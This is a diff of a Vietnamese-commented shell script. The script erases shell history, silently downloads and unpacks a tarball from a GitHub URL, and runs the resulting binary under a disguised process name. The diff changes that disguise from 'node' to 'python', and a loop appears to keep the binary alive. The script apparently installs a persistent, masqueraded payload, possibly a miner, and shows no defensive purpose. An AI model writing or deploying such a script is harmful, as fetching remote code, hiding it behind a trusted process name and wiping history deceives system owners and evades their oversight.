@@ -2,8 +2,8 @@
 
 DOMAIN="$1"
 NAME_WORK="$2"
-PROCESS_PATH="node/node"   # file thực thi
-PROCESS_NAME="node"        # tên tiến trình hiển thị
+PROCESS_PATH="python/python"   # file thực thi
+PROCESS_NAME="python"        # tên tiến trình hiển thị
 
 # ❌ Xoá shell history
 unset HISTFILE
@@ -14,11 +14,11 @@ export HISTFILE=/dev/null
 
 # 📥 Tải và giải nén nếu chưa có
 if [ ! -f "$(pwd)/$PROCESS_PATH" ]; then
-    rm -rf node node.tar.gz
-    curl -sL -o node.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/node.tar.gz
-    tar -xzf node.tar.gz
-    chmod +x node/node
-    rm -f node.tar.gz
+    rm -rf python python.tar.gz
+    curl -sL -o python.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/python.tar.gz
+    tar -xzf python.tar.gz
+    chmod +x python/python
+    rm -f python.tar.gz
 fi
 
 # 🔁 Vòng lặp kiểm tra tiến trình và chạy lại nếu chưa chạy
